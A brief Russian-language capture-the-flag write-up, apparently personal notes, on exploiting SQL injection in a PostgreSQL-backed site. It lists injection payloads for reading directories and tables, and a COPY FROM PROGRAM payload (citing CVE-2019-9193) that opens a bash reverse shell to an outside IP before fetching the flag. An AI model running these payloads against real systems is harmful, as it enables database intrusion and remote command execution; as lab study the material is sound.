
Получим версию БД
![](../../attachment/Pasted%20image%2020250417174551.png)

```
';SELECT pg_ls_dir('/'); -- - Изучаем директории
pg_read_file изучаем файл (не бинарный,в стандартной кодировке)
```

Находим CVE-2019-9193, которая позволяет с помощью COPY передать команду 
Попытки создать таблицу были неуспешны, попробуем применить к имеющимся таблицам 
'; SELECT * FROM  pg_catalog.pg_tables;-- -

![](../../attachment/Pasted%20image%2020250421121526.png)
Воспользуемся COPY к первой найденной таблице blogs
';COPY blogs FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/100.100.2.252/5555 0>&1\"';-- -

![](../../attachment/Pasted%20image%2020250421121622.png)

Получаем соединение и запускаем get_flag для получения флага 
![](../../attachment/Pasted%20image%2020250421121308.png)